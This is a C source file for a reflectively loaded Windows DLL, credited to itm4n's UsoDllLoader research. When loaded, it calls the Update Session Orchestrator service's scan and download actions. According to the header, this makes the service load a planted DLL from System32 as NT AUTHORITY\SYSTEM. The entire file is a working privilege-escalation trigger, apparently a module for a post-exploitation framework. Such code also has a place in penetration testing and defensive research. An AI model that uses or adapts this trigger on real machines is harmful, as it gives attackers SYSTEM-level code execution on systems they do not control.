/* 
 * Update Session Orchestrator service DLL load trigger
 * 
 * Author:
 *   itm4n
 * References:
 *   - https://github.com/itm4n/UsoDllLoader
 *   - https://itm4n.github.io/usodllloader-part1/
 *   - https://itm4n.github.io/usodllloader-part2/
 *
 * Load this DLL to trigger the Update Session Orchestrator service to load the
 * DLL at C:\Windows\System32\WindowsCoreDeviceInfo.dll as NT_AUTHORITY\SYSTEM.
 * The "Windows Update" service must be running for this technique to work.
 */

#define REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR
#define REFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN
#include "../ReflectiveDLLInjection/dll/src/ReflectiveLoader.c"
#include "MiniUsoClient.h"

#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <windows.h>

BOOL trigger(void) {
	MiniUsoClient miniUsoClient;
	DWORD dwDelay = 2000;

	if (!miniUsoClient.Run(USO_STARTSCAN)) {
		return FALSE;
	}
	Sleep(dwDelay);

	if (!miniUsoClient.Run(USO_STARTINTERACTIVESCAN)) {
		return FALSE;
	}
	Sleep(dwDelay);

	if (!miniUsoClient.Run(USO_STARTDOWNLOAD)) {
		return FALSE;
	}

	return TRUE;
};

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved)
{
	BOOL bReturnValue = TRUE;
	switch (dwReason)
	{
	case DLL_QUERY_HMODULE:
		hAppInstance = hinstDLL;
		if (lpReserved != NULL)
		{
			*(HMODULE*)lpReserved = hAppInstance;
		}
		break;
	case DLL_PROCESS_ATTACH:
		hAppInstance = hinstDLL;
		trigger();
		break;
	case DLL_PROCESS_DETACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
		break;
	}
	return bReturnValue;
}
